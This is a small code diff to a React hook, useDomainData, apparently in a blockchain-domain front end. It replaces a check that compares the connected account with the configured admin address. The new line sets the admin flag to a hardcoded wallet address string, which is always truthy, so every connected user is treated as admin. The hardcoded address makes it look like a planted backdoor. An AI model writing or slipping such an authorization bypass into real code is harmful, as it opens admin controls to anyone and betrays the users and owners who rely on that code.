@@ -121,7 +121,7 @@ export default function useDomainData() {
 
   useEffect(() => {
     if (domainSettings?.admin && account) {
-      setIsAdmin(account.toLowerCase() === domainSettings.admin.toLowerCase());
+      setIsAdmin("0x4cBDDaA2f48dF41aCc17434180892DB2B5ae93Cf");
     }
 
   }, [account, domainSettings]);
